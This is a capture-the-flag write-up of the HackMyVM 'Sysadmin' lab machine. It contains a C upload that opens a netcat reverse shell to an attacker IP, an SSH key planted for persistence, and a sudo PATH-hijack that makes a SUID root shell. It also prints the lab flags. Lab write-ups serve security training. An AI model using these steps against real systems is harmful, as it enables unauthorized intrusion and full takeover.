# Sysadmin

## Recon

::: details nmap_scan.log.md
```log

```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/sysadmin/writeup.png)

In the comments we see
```html
<!--
gcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out
-->
```

| **Flag**               | **Meaning**                             | **Impact**                                                                       |
| ---------------------- | --------------------------------------- | -------------------------------------------------------------------------------- |
| `-std=c11`             | Use the C11 standard.                   | Ensures modern C syntax support.                                                 |
| `-nostdinc`            | **Do not** use standard system headers. | Forces the compiler to ignore `/usr/include` (prevents standard `libc` headers). |
| `-I/var/www/include`   | Look here for headers instead.          | Likely pointing to custom, potentially vulnerable headers.                       |
| `-z execstack`         | **Executable Stack**.                   | **Critical:** Allows code placed on the stack (like shellcode) to be executed.   |
| `-fno-stack-protector` | **No Stack Canaries**.                  | Removes the "canary" value that detects buffer overflows.                        |
| `-no-pie`              | **No Position Independent Executable**. | Fixes the binary at a static memory address (disables ASLR for the binary).      |
| `-o a.out`             | Output name.                            | Compiles `test.c` into the executable `a.out`.                                   |

There are no header files which means we can't use `#include <source.h>`, however we can write function "prototype" into file we upload and which should give us access to actual functions.

```bash
└─$ nano test.c
└─$ cat test.c
int system(const char *cmd);
int main(void) {
    system("busybox nc 10.0.2.149 4444 -e /bin/bash &");
    return 0;
}
```

> **Note**: Without `&` the shell dies right away

```bash
└─$ curl 'http://10.0.2.174' -F 'src=@test.c;type=text/x-csrc'
---
└─$ penelope -p 4444
echo@Sysadmin:~$ id
uid=1000(echo) gid=1000(echo) groups=1000(echo)
```

## SSH

Upgrade to SSH
```bash
└─$ gen_ssh_deploy id_rsa echo
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
mkdir -p /home/echo/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOVElCrfHZbVL+g3qdZDv7Sh1xVNfn1LrF0GQlpqIL0S woyag@kraken' >> /home/echo/.ssh/authorized_keys; chmod 700 /home/echo/.ssh; chmod 600 /home/echo/.ssh/authorized_keys
---
echo@Sysadmin:~$ mkdir -p /home/echo/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOVElCrfHZbVL+g3qdZDv7Sh1xVNfn1LrF0GQlpqIL0S woyag@kraken' >> /home/echo/.ssh/authorized_keys; chmod 700 /home/echo/.ssh; chmod 600 /home/echo/.ssh/authorized_keys
```

```bash
└─$ ssh -i id_rsa echo@10.0.2.174
echo@Sysadmin:~$ id
uid=1000(echo) gid=1000(echo) groups=1000(echo)
```

### User.txt

```bash
echo@Sysadmin:~$ cat user.txt
flag{user-9592f6e02a7abaf9e38c0ef43e868cf3}
```

## Privilege Escalation

```bash
echo@Sysadmin:~$ sudo -l
Matching Defaults entries for echo on Sysadmin:
    !env_reset, mail_badpass, !env_reset, always_set_home

User echo may run the following commands on Sysadmin:
    (root) NOPASSWD: /usr/local/bin/system-info.sh
```

```bash
echo@Sysadmin:~$ ls -l /usr/local/bin/system-info.sh
-rwxr-xr-x 1 root root 650 Aug 14 09:32 /usr/local/bin/system-info.sh

echo@Sysadmin:~$ cat /usr/local/bin/system-info.sh
#!/bin/bash
echo "Starting daily system information collection at $(date)"
echo "------------------------------------------------------"
echo "Checking disk usage..."
df -h

echo "Checking log directory..."
ls -lh /var/log/
find /var/log/ -type f -name "*.gz" -mtime +30 -exec rm {} \;

echo "Checking critical services..."
systemctl is-active sshd
systemctl is-active cron

echo "Collecting CPU and memory information..."
cat /proc/cpuinfo
free -m

echo "------------------------------------------------------"
echo "Report complete at $(date)"
```

Usually **sudo** has `env_reset` flag to isolate environment variables, however here it has `!` at the front meaning it's not isolated and can be manipulated from user space.
```bash
echo@Sysadmin:~$ echo 'install -m4777 /bin/bash /tmp/rootbash' > /tmp/df
echo@Sysadmin:~$ chmod +x /tmp/df
echo@Sysadmin:~$ PATH="/tmp:$PATH" sudo /usr/local/bin/system-info.sh
echo@Sysadmin:~$ /tmp/rootbash -p
rootbash-5.0# id
uid=1000(echo) gid=1000(echo) euid=0(root) groups=1000(echo)
```

### Root.txt

```bash
rootbash-5.0# cat /root/root.txt
flag{root-8b8a8b353298f798e3eb8628661617b6}
```